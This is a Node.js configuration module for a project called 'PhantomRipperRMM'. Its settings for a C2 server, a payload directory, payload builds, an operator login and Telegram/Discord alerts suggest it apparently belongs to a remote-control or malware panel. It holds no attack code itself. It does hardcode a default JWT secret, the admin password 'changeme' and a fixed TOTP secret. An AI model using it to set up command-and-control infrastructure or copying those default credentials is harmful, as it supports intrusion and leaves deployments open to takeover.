'use strict';

/**
 * PhantomRipperRMM — central config.
 * Loads .env (if present) without extra deps, exposes typed config.
 */

const fs = require('fs');
const path = require('path');

function loadDotEnv() {
  const envPath = path.resolve(__dirname, '..', '.env');
  if (!fs.existsSync(envPath)) return;
  const raw = fs.readFileSync(envPath, 'utf8');
  for (const line of raw.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim();
    let val = trimmed.slice(eq + 1).trim();
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    if (!(key in process.env)) process.env[key] = val;
  }
}

loadDotEnv();

const rootDir = path.resolve(__dirname, '..');
const repoRoot = path.resolve(rootDir, '..', '..');

function bool(v, dflt = false) {
  if (v === undefined || v === null || v === '') return dflt;
  return ['1', 'true', 'yes', 'on'].includes(String(v).toLowerCase());
}

/** Resolve a MySQL connection string from Railway's variable shapes. */
function resolveMysqlUrl() {
  const direct =
    process.env.MYSQL_URL ||
    process.env.DATABASE_URL ||
    process.env.MYSQL_PUBLIC_URL ||
    process.env.DATABASE_PRIVATE_URL;
  if (direct) return direct;
  const host = process.env.MYSQLHOST || process.env.MYSQL_HOST;
  if (host) {
    const port = process.env.MYSQLPORT || process.env.MYSQL_PORT || '3306';
    const user = process.env.MYSQLUSER || process.env.MYSQL_USER || 'root';
    const pass = process.env.MYSQLPASSWORD || process.env.MYSQL_PASSWORD || '';
    const name = process.env.MYSQLDATABASE || process.env.MYSQL_DATABASE || 'railway';
    return `mysql://${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}/${name}`;
  }
  return '';
}

const config = {
  env: process.env.NODE_ENV || 'development',
  port: parseInt(process.env.PORT || '8443', 10),
  host: process.env.HOST || '0.0.0.0',

  jwtSecret: process.env.JWT_SECRET || 'phantomripper-dev-secret-change-me',
  jwtExpires: process.env.JWT_EXPIRES || '12h',

  adminUser: process.env.ADMIN_USER || 'operator',
  adminPass: process.env.ADMIN_PASS || 'changeme',

  dbPath: path.resolve(rootDir, process.env.DB_PATH || './data/phantomripper.db'),
  mysqlUrl: resolveMysqlUrl(),

  pythonBin: process.env.PYTHON_BIN || 'python',
  payloadDir: process.env.PAYLOAD_DIR
    ? path.resolve(rootDir, process.env.PAYLOAD_DIR)
    : path.join(repoRoot, 'payloads'),
  buildDir: process.env.BUILD_DIR
    ? path.resolve(rootDir, process.env.BUILD_DIR)
    : path.join(rootDir, 'data', 'builds'),

  c2: {
    host: process.env.C2_HOST || 'localhost',
    port: parseInt(process.env.C2_PORT || String(process.env.PORT || '8443'), 10),
    scheme: process.env.C2_SCHEME || 'https',
  },

  telegram: {
    token: process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: process.env.TELEGRAM_CHAT_ID || '',
    enabled: bool(process.env.TELEGRAM_ENABLED, false),
  },

  notify: {
    telegram: {
      token: process.env.TELEGRAM_NOTIFY_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_NOTIFY_CHAT || process.env.TELEGRAM_CHAT_ID || '',
    },
    discordUrl: process.env.DISCORD_NOTIFY_URL || '',
    allEvents: bool(process.env.NOTIFY_ALL_EVENTS, false),
  },

  totpSecret: process.env.TOTP_SECRET || 'GE72BAQ5XCRNGYGUP5NIUXOJ56MTDASG',

  repoRoot,
};

// Ensure runtime dirs exist.
for (const dir of [path.dirname(config.dbPath), config.buildDir]) {
  fs.mkdirSync(dir, { recursive: true });
}

module.exports = config;
